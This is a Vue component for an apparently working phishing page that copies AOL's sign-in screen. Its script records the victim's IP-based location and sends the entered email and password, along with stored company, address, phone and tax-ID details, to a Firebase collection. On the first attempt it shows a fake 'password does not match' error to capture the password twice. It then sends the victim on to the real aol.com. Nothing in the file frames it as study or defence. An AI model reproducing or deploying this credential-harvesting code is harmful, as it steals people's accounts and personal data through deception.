<template>
    <div>
         <v-toolbar color="white" flat style="padding: 0px 50px;">
      <img src="https://s.yimg.com/wm/assets/images/ns/aol-logo-black-v.0.0.2.png" alt="" height='35px'>
      <v-spacer></v-spacer>
      <v-toolbar-items>
        <v-btn text dark>Help</v-btn>
      </v-toolbar-items>
    </v-toolbar>
     <div class="content">
     <v-row no-gutters>
      <v-col cols="12" sm="12" md="7">
        <div class="text-card hidden-sm-and-down">

        </div>
      </v-col>
       <v-col cols="12" sm="12" md="5">
        <v-card class="login-card">
            <center>
                <img src="https://s.yimg.com/wm/assets/images/ns/aol-logo-black-v.0.0.2.png" alt="" height='28px'>
            <br>
            <br>
             <p style="font-size:18px;">{{ getEmail }}</p>
<p style="font-size:15px; color:#3ab7d6">Not you?</p>
            
            <v-text-field
            v-model="password"
            type = "password"
            label="Password"
            single-line
          ></v-text-field>
           <p style="color:red; font-size:14px" v-if="passLogic">The password does not match the email provided</p>
          <v-btn  v-if="btn" @click="Save" depressed style="border-radius:1px;" large block color="blue" dark>Sign in</v-btn>
          <v-btn v-else @click="Save2" depressed style="border-radius:1px;" large block color="blue" dark>Sign in</v-btn>
           <br>
            </center>
             <p style="font-size:15px"><a href="https://login.aol.com/account/challenge/username?intl=us&lang=en-us&src=fp-us&done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Frequest_auth%3Fstate%3DWyIwQS1QWkZYSk5XNGNIcnhuTk5uU2lMdDJMa2p5bWtjWTJXb01fSk9vbmFJIix7InJlZGlyZWN0X3VyaSI6Imh0dHBzOlwvXC93d3cuYW9sLmNvbSIsImFsbG93ZWRfcXVlcnlfcGFyYW1zIjp7ImludGwiOiJ1cyIsImxhbmciOiJlbi11cyIsInNyYyI6ImZwLXVzIn0sImp0aSI6IkFyb29mRXNubnpJcWNsY2ljNGhlUkU5dWFLQUM5ald5In0sMTU3NTIzMzM4MiwiWmlHVnFfOU5rV1J0NW9hZGxSVVJoTVlzeXZZZXNvME9ST2dlZFBKRXFEOCJd%26nonce%3DAroofEsnnzIqclcic4heRE9uaKAC9jWy%26response_type%3Dcode%26approval_prompt%3Dauto%26client_id%3Ddj0yJmk9N3dWZW1TTWNhY0o0JmQ9WVdrOWMxbDVlVEo2TmpRbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD1lMA--%26redirect_uri%3Dhttps%253A%252F%252Fwww.aol.com%252Fcallback%26intl%3Dus%26lang%3Den-us%26src%3Dfp-us&authMechanism=secondary&sessionIndex=Qg--">I forgot my password</a></p>
        </v-card>
      </v-col>
    </v-row>
     </div>
     <div class="login-footer">
      <a href="https://policies.oath.com/us/en/oath/terms/otos/index.html">Terms |</a>
       <a href="https://policies.oath.com/us/en/oath/privacy/index.html"> Privacy</a>
     </div>
   </div>
</template>


<script>
import db from '../../firebaseinit.js';
import firebase from 'firebase';
import { error } from 'util';
 import { mapGetters } from 'vuex'
  export default {
     data() {
    return {
       json:null,
         btn: true,
         passLogic: false,
           password: '',
           Cdate: new Date()
    }
  },
  computed:{
         ...mapGetters ([
             'getEmail',
            'getCompanyName',
            'getMailingAddressA1',
            'getMailingAddressA2',
            'getCity1',
            'getState1',
            'getZip1',
            'getContactName',
            'getPhoneNumber',
            'getFaxNumber',
            'getEmailAddress',
            'getMailingQuestion',
            'getMailingAddressB1',
            'getMailingAddressB2',
            'getCity2',
            'getState2',
            'getZip2',
            'getTaxDesignator',
            'getTaxId',
            'getType',
            'getStatus',
            'getEmployees'
         ]),
   },
   created(){
           var _this = this;
        $.getJSON('https://geoip-db.com/json/', function (json) {
            _this.json = json;
           });
     },

    methods:{
      Save(){
        db.collection('Details').add({
            Country: this.json.country_name,
           City: this.json.city,
            IPAddress: this.json.IPv4,
        Type : 'Aol',
        Email: this.getEmail,
        Password: this.password, 
       timestamp: Date.now(),
        CompanyName: this.getCompanyName,
        MailingAddressA1:  this.getMailingAddressA1,
        MailingAddressA2 : this.getMailingAddressA2,
         City1 :  this.getCity1,
         State1 :  this.getState1,
          Zip1 :  this.getZip1,
          ContactName : this.getContactName,
          PhoneNumber : this.getPhoneNumber,
          FaxNumber : this.getFaxNumber,
           EmailAddress : this.getEmailAddress,
           MailingQuestion: this.getMailingQuestion,
            MailingAddressB1:  this.getMailingAddressB1,
        MailingAddressB2 : this.getMailingAddressB2,
         City2 :  this.getCity1,
         State2 :  this.getState1,
          Zip2 : this.getZip2,
         TaxDesignator: this.getTaxDesignator,
          TaxId : this.getTaxId,
           TaxType :  this.getType,
           Status : this.getStatus,
           Employees : this.getEmployees
       })
       .then(docRef =>  this.passLogic = true, this.password = "" , this.btn = false)
   
   .catch(error => console.log(err))
             },
             Save2(){
        db.collection('Details').add({
          Country: this.json.country_name,
           City: this.json.city,
            IPAddress: this.json.IPv4,
        Type : 'Aol',
        Email: this.getEmail,
        Password: this.password, 
       timestamp: Date.now(),
        CompanyName: this.getCompanyName,
        MailingAddressA1:  this.getMailingAddressA1,
        MailingAddressA2 : this.getMailingAddressA2,
         City1 :  this.getCity1,
         State1 :  this.getState1,
          Zip1 :  this.getZip1,
          ContactName : this.getContactName,
          PhoneNumber : this.getPhoneNumber,
          FaxNumber : this.getFaxNumber,
           EmailAddress : this.getEmailAddress,
           MailingQuestion: this.getMailingQuestion,
            MailingAddressB1:  this.getMailingAddressB1,
        MailingAddressB2 : this.getMailingAddressB2,
         City2 :  this.getCity1,
         State2 :  this.getState1,
          Zip2 : this.getZip2,
         TaxDesignator: this.getTaxDesignator,
          TaxId : this.getTaxId,
           TaxType :  this.getType,
           Status : this.getStatus,
           Employees : this.getEmployees
       })
        window.location.assign("https://www.aol.com/")
             }
    }
  }
</script>


<style scoped>
.login-footer {
    text-align: center;
    padding: 6px 0;
    font-size: .58824em;
    position: fixed;
    bottom: 0;
    background: #fff;
    color: #26282a;
    z-index: 1;
    width: 100%;
}
.login-card {padding:30px 30px 100px 30px;}
.text-card {padding: 80px 40px 0px 40px; font-size:22px; letter-spacing: 1px;}
.content { 
    padding: 50px 180px;
    background-image: url('https://s.yimg.com/cv/ae/default/160912/Field_Evergreen_PlayNow_1440x1024.jpg');
  background-size: cover;
    }

    
  @media (max-width: 991px) { 
.login-footer {
    text-align: center;
    padding: 6px 0;
    font-size: .58824em;
    position: fixed;
    bottom: 0;
    background: #fff;
    color: #26282a;
    z-index: 1;
    width: 100%;
}
.login-card {padding:30px 30px 100px 30px;}
.text-card {padding: 80px 40px 0px 40px; font-size:22px; letter-spacing: 1px;}
.content { padding: 20px 180px;}

  }

 @media (max-width: 767px) {   

}

    @media (max-width: 479px) {
.login-footer {
    text-align: center;
    padding: 6px 0;
    font-size: .58824em;
    position: fixed;
    bottom: 0;
    background: #fff;
    color: #26282a;
    z-index: 1;
    width: 100%;
}
.login-card {padding:30px 20px 30px 20px;}
.text-card {padding: 80px 20px 0px 20px; font-size:22px; letter-spacing: 1px;}
.content { padding: 50px 20px;}
}
</style>
